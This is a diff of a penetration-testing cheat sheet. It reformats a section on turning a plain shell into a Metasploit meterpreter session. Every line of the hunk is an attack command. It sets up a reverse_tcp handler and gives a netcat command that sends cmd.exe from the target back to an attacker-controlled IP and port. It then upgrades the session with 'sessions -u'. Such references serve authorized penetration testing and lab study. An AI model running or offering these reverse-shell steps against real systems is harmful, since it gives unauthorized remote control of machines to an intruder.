@@ -111,19 +111,19 @@ See [msfvenom cheat sheet](http://thor-sec.com/cheatsheet/msfvenom_cheat_sheet/)
 
 #### Turn a regular shell into a meterpreter shell    
 * #####  Attacker  
-- `use exploit/multi/handler`  
-- `set payload windows/shell/reverse_tcp`  
-- `set lhost <IP>`  
-- `set lport <PORT>`  
-- `run`  
+  - `use exploit/multi/handler`  
+  - `set payload windows/shell/reverse_tcp`  
+  - `set lhost <IP>`  
+  - `set lport <PORT>`  
+  - `run`  
 * ##### Target  
-- `nc -vn <IP> <PORT> -e cmd.exe`  
+  - `nc -vn <IP> <PORT> -e cmd.exe`  
 * ##### Attacker  
-- Ctrl+Z (to background session)
-- `sessions -l` (this will list your sessions to verify which one it is)
-- `setg rhost <IP>`  
-- `setg lhost <IP>`  
-- `sessions -u 1` (the 1 is the session number)
+  - Ctrl+Z (to background session)
+  - `sessions -l` (this will list your sessions to verify which one it is)
+  - `setg rhost <IP>`  
+  - `setg lhost <IP>`  
+  - `sessions -u 1` (the 1 is the session number)
 
 #### Netcat  
 See [Netcat cheat sheet](http://thor-sec.com/cheatsheet/netcat_cheatsheet/) section  
